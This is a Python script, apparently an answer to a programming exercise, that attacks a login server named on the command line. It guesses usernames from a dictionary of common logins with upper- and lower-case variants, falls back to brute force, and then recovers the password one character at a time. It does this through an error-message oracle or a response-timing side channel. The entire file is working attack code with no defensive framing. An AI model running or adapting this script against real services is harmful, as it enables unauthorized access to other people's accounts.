import socket
import sys
import json
from datetime import datetime
from itertools import product
from string import digits, ascii_letters


def hack_login(socket_, logins):
    wrong_pass_msg = b'{"result": "Wrong password!"}'
    exception_msg = b'{"result": "Exception happened during login"}'
    for login in logins:
        socket_.send(json.dumps({"login": login, "password": ""}).encode())
        response = socket_.recv(1024)
        if response == exception_msg or response == wrong_pass_msg:
            return login


def hack_pass_using_exception(socket_, login, chars):
    success_msg = b'{"result": "Connection success!"}'
    exception_msg = b'{"result": "Exception happened during login"}'
    password_builder = ""

    while True:
        for c in chars:
            temp_pass = password_builder + c
            socket_.send(json.dumps({"login": login, "password": temp_pass}).encode())
            response = socket_.recv(1024)
            if response == success_msg:
                return temp_pass
            if response == exception_msg:
                password_builder = temp_pass
                break


def hack_pass_using_response_delay(socket_, login, chars, delay_percent):
    success_msg = b'{"result": "Connection success!"}'
    password_builder = ""
    delay = measure_response_time(socket_, login, "", 30)
    delay *= delay_percent / 100 + 1

    while True:
        for c in chars:
            temp_pass = password_builder + c
            socket_.send(json.dumps({"login": login, "password": temp_pass}).encode())
            start = datetime.now().timestamp()
            response = socket_.recv(1024)
            end = datetime.now().timestamp()
            if response == success_msg:
                return temp_pass
            if end - start >= delay:
                password_builder = temp_pass
                break


def measure_response_time(socket_, login, password, tries):
    dt_accumulator = 0
    for _ in range(tries):
        socket_.send(json.dumps({"login": login, "password": password}).encode())
        start = datetime.now().timestamp()
        response = socket_.recv(1024)
        end = datetime.now().timestamp()
        dt_accumulator += end - start
    return dt_accumulator / tries


def hack_single_pass_server(socket_, passwords):
    for password in passwords:
        socket_.send(password.encode())
        if socket_.recv(1024).decode() == "Connection success!":
            return password


def password_gen(pass_max_len, chars):
    for i in range(1, pass_max_len + 1):
        for p in product(chars, repeat=i):
            yield "".join(p)


def read_lines_from_file(path):
    with open(path) as file:
        return file.read().split("\n")


def dict_based_gen(dictionary):
    for line in dictionary:
        for password in product(*[c + c.upper() for c in line]):  # example:  "hack" -> "hH", "aA", "cC", "kK"
            yield "".join(password)


def hack():
    with socket.socket() as st:
        st.connect((sys.argv[1], int(sys.argv[2])))
        login = hack_login(st, dict_based_gen(read_lines_from_file("dictionaries/typical_logins.txt")))
        if not login:
            login = hack_login(st, password_gen(16, digits + ascii_letters))
        password = hack_pass_using_response_delay(st, login, digits + ascii_letters, 5)
    return json.dumps({"login": login, "password": password})


print(hack())
